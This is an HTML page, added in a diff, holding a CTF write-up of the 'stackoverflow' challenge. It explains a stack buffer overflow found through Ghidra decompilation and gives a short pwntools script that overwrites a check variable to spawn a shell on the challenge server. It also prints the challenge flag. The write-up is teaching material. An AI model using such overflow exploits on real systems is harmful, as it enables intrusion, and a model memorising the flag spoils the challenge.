@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>stackoverflow</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>buffer overflow</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="stackoverflow_0"></a>stackoverflow</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">Welcome to Stack Overflow! Get answers to all your programming questions right here!</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided binary for decompilation</p>
+<h2 class="code-line" data-line-start=7 data-line-end=8><a id="Decompiled_code_7"></a>Decompiled code</h2>
+<p class="has-line-data" data-line-start="8" data-line-end="9">We use ghidra to decompile the binary.</p>
+<h3 class="code-line" data-line-start=10 data-line-end=11><a id="stackoverflow_10"></a><code>stackoverflow</code></h3>
+<p class="has-line-data" data-line-start="11" data-line-end="12"><img src="./decompiled.PNG" alt="decompiled"></p>
+<h2 class="code-line" data-line-start=13 data-line-end=14><a id="Methodology_13"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="14" data-line-end="15">From the code we can see that we are prompted for our favourite color. This value is pushed to a variable <code>local_38</code> which has 40 bytes of memory allocated. Then there is a check if a variable <code>local_10</code> is of value <code>0x69637466</code> and if yes, we get a shell. From the code there is no way to control this value. We can however overflow our input buffer and overwrite the memory of this variable.</p>
+<h2 class="code-line" data-line-start=16 data-line-end=17><a id="Exploit_16"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="17" data-line-end="18">We use <code>pwntools</code> to interact with the remote server. We send 40 <code>A</code>s followed by the required hex value to spawn a shell.</p>
+<h2 class="code-line" data-line-start=19 data-line-end=20><a id="Exploit_code_19"></a>Exploit code</h2>
+<pre><code class="has-line-data" data-line-start="21" data-line-end="32" class="language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">'chal.imaginaryctf.org'</span>, <span class="hljs-number">42001</span>)
+
+r.recvline()
+a = p32(<span class="hljs-number">0x69637466</span>)
+s = <span class="hljs-string">b'A'</span>*<span class="hljs-number">40</span> + a + <span class="hljs-string">b'\r\n'</span>
+
+r.send(s)
+r.interactive()
+</code></pre>
+<h2 class="code-line" data-line-start=33 data-line-end=34><a id="Loot_33"></a>Loot</h2>
+<p class="has-line-data" data-line-start="34" data-line-end="35"><img src="./flag.PNG" alt="flag"></p>
+<h2 class="code-line" data-line-start=36 data-line-end=37><a id="Flag_36"></a>Flag</h2>
+<p class="has-line-data" data-line-start="37" data-line-end="38"><strong>ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
